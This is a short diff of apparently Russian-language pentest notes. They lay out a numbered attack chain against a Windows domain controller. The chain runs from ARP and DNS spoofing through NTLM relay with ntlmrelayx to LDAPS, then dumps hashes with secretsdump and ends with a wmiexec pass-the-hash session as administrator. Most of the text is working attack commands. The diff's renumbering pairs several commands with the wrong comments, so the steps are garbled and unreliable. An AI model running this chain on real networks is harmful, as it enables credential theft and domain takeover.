@@ -31,14 +31,13 @@ sendp(Ether(dst='92:94:88:A8:EE:94')/ARP(op='is-at', psrc='192.168.0.1', hwsrc='
 	Говорим, что во всех DNS ответах спуфим все домены
 8) set dns.spoof.address 192.168.0.
 	 И все DNS ответы спуфим на IP атакующего
-9)  
-	Включаем DNS spoofing
-10) arp.spoof on
-	Включаем ARP spoofing
-11) sudo ntlmrelayx.py -6 -smb2support -l loot.d -of loot.txt -t ldaps://192.168.0.100 (Ip контроллера домена) --no-dump
-12) secretsdump.py newlogin@192.168.0.100  ...    newpass
+9)  Включаем DNS spoofing
+	arp.spoof on
+10) Включаем ARP spoofing
+	sudo ntlmrelayx.py -6 -smb2support -l loot.d -of loot.txt -t ldaps://192.168.0.100 (Ip контроллера домена) --no-dump
+11) secretsdump.py newlogin@192.168.0.100  ...    newpass
 	 Извлечение хэшей при помощи новой учетной записи с правами админа
-13) wmiexec.py -hashes :NTLMхэш  administrator@192.168.0.100
+12) wmiexec.py -hashes :NTLMхэш  administrator@192.168.0.100
 	Получаем сессию контроллера домена
 
 
